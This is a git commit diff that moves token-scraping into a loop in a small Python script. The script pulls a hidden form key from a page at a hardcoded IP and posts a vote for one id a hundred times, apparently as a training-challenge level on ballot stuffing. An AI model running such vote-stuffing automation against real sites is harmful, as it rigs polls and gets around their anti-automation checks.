344b17cdd444af838d3da134dca17668485e464d
Dave Yoon <daveyoon64@gmail.com>
2018-01-21 22:25:10 +0000

    Properly loop the script

--- level_1/vote_4096.py
+++ level_1/vote_4096.py
@@ -5,15 +5,14 @@ from bs4 import BeautifulSoup
 payload = {'id': 244, 'holdthedoor': 'Submit'}
 url = "http://158.69.76.135/level1.php"
 
-# get the sites HTML
-site = requests.get(url)
-# scrape the site for its key
-soup = BeautifulSoup(site.text, 'html.parser')
-secret = soup.find('input', attrs={'name':'key'})['value']
-#print(secret)
-
-# create and append our header
-headers = {'HoldTheDoor': secret}
-#payload.update({'key': new_cookie})
 for i in range(100):
+    # get the sites HTML
+    site = requests.get(url)
+    # scrape the site for its key
+    soup = BeautifulSoup(site.text, 'html.parser')
+    secret = soup.find('input', attrs={'name':'key'})['value']
+
+    # create and append our header
+    headers = {'HoldTheDoor': secret}
+    #payload.update({'key': new_cookie})
     r = requests.post(url, data=payload, headers=headers)
